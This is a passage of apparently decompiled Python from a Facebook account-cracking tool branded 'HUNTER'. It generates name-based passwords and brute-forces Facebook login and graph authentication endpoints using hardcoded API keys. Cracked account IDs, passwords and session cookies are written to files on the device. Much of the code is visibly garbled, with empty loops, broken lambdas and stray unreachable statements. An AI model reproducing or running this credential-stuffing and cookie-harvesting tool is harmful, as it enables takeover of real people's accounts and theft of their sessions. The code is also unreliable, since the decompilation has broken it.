            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8', data = log_data, headers = header_freefb).text
            log_cookies = session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                for key, value in []:
                    value = session.cookies.get_dict().items()[key + '=' + value]
                    key = session.cookies.get_dict().items()
                    coki = None(';'.join)
                    cid = 22
                    print('\r\r\x1b[1;32m [HUNTER-OK] ' + ids + ' | ' + ps)
                    print('\x1b[1;34m [\x1a] COOKI :-\x1b[1;30m ' + coki)
                    open('/sdcard/HUNTER-BD-OK.txt', 'a').write(ids + ' | ' + ps + ' | ' + coki + '\n')
                    oks.append(cid)
                    7
                    if 'checkpoint' in log_cookies:
                        for key, value in []:
                            value = session.cookies.get_dict().items()[key + '=' + value]
                            key = session.cookies.get_dict().items()
                            coki = None(';'.join)
                            cid = 39
                            print('\r\r\x1b[1;91m [HUNTER-CP] ' + ids + ' | ' + ps + '\x1b[1;91m')
                            open('/sdcard/HUNTER-BD-CP.txt', 'a').write(ids + ' | ' + ps + ' \n')
                            cps.append(cid)
                            if twf in session.cookies.get_dict().keys():
                                print('\x1b[1;93m\x1b[0;34mHUNTER-2F ' + ids + ' • ' + ps + '  \x1b[0;97m')
                                24
        loop += 1
        return None
        coki
        value = coki
        key = 'Connection'
        'd29d67d37eca387482a8a5b740f84f62'
        value = 'x-fb-connection-token'
        key = 'True'
        if requests.exceptions.ConnectionError:
            'X-FB-Server-Cluster'
            time.sleep(20)
            return None
        if Exception:
            e = 'True'
            e = None
            del e
            return None
            e = None
            del e

    
    def newidx(ids, names, passlist):
        global loop
        sys.stdout.write(f'''\r\r\x1b[1;37m [\x1b[1;92mHUNTER\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] {loop!s}|\x1b[1;37mOK|{len(oks)!s} \x1b[1;37m''')
        sys.stdout.flush()
        fn = names.split(' ')[0]
        ln = names.split(' ')[1]
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            head = {
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62' }
            data = {
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d' }
            po = requests.post('https://b-graph.facebook.com/auth/login', data = data, headers = head).json()
            if 'session_key' in po:
                uid = str(po['uid'])
                print('\r\r\x1b[1;32m [HUNTER-OK] ' + uid + ' | ' + pas + '|' + asha(uid) + '\x1b[1;32m')
                ckkk = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
                ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                cookies = f'''sb={ssbb};{ckkk}'''
                print('\x1b[1;93m [\x1a] COOKI :-\x1b[1;30m ' + cookies)
                open('/sdcard/HUNTER-OK.txt', 'a').write(uid + '|' + pas + '|' + cookies + '\n')
                oks.append(uid)
                ';'.join
            if 'www.facebook.com' in po['error']['message']:
                uid = str(po['error']['error_data']['uid'])
                print('\r\r\x1b[1;91m [HUNTER-CP] ' + uid + ' | ' + pas + '\x1b[1;91m')
                open('/sdcard/HUNTER-CP.txt', 'a').write(uid + '|' + pas + '\n')
                cps.append(uid)
        loop += 1
        return None
        'PK'
        ln = fn
        if requests.exceptions.ConnectionError:
            'client_country_code'
            time.sleep(20)
            return None
        if Exception:
            e = 'en_PK'
            e = None
            del e
            return None
            e = None
            del e

    menu()
    return None
    os.system('pip install bs4')
    from bs4 import BeautifulSoup as bsp
    if ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python s1n.py')
        os.system('xdg-open https://www.facebook.com/profile.php?id=100065262168876&mibextid=ZbWKwL')
